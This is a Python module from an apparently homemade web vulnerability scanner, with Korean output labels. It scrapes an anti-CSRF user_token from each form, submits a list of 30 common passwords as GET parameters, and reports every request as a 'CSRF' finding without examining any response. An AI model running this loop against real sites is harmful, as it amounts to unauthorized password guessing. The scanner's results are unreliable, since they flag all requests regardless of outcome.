from rich.console import Console
from rich.table import Table
from bs4 import BeautifulSoup
import requests

def run(soup, headers, find_path_dic):
    payload = [
        '123456', 'password', '12345678', 'qwerty', '12345', '123456789',
        'letmein', '1234567', 'football', 'iloveyou', 'admin', 'welcome',
        'monkey', 'login', 'abc123', 'starwars', '123123', 'dragon',
        'passw0rd', 'master', 'hello', 'freedom', 'whatever', 'qazwsx',
        'trustno1', '654321', 'jordan23', 'harley', 'password01', '1234'
    ]

    console = Console()
    result_table = []

    for param_dic in find_path_dic:
        param_url = param_dic['url']
        param_method = param_dic['method']

        if param_method.upper() == 'GET':
            user_token = ''
            if 'user_token' in param_dic['param']:
                res = requests.get(param_url, headers=headers)
                soup = BeautifulSoup(res.text, "html.parser")
                for location in soup.select('input'):
                    if location.get('name') == 'user_token':
                        user_token = location.get('value', '')

            for attack in payload:
                query_string = ''
                for param in param_dic['param']:
                    if param == 'user_token':
                        query_string += f"{param}={user_token}&"
                    else:
                        query_string += f"{param}={attack}&"

                p_url = f"{param_url}?{query_string}".rstrip("&")

                res = requests.get(p_url, headers=headers)

                result_table.append({
                    "URL": p_url,
                    "VULN": "CSRF",
                    "Payload": query_string.rstrip("&")
                })

   
    if result_table:
        table = Table(
            title="📄  CSRF 스캔 결과",
            title_style="bold magenta",
            show_lines=True  
        )

        table.add_column("VULN", style="red", no_wrap=False, overflow="fold")
        table.add_column("URL", style="cyan", justify="center")
        table.add_column("Payload", style="green", no_wrap=False, overflow="fold")

        for row in result_table:
            table.add_row(row["VULN"], row["URL"], row["Payload"])

        console.print(table)
    else:
        console.print("[bold red][!] 탐지된 CSRF 취약점이 없습니다.[/bold red]")

    return result_table
